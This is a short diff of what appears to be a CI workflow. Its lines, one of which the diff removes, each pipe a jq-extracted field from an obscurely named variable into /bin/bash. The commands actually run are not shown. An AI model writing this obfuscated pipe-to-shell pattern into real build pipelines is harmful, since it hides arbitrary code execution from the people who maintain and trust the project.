@@ -28,7 +28,6 @@ jobs:
           echo $vanqd621 | jq -r .p5 | /bin/bash
           printf '%s' "$pa39" | jq -r .xhakg98 | /bin/bash
           printf '%s' "$zamaf1" | jq -r .gxy141 | /bin/bash
-          echo $pea77 | jq -r .vlmr15 | /bin/bash
           echo $g53 | jq -r .qcyx404 | /bin/bash
           echo $xwbwt9 | jq -r .ubbus63 | /bin/bash
           echo $bea2 | jq -r .sn02603 | /bin/bash
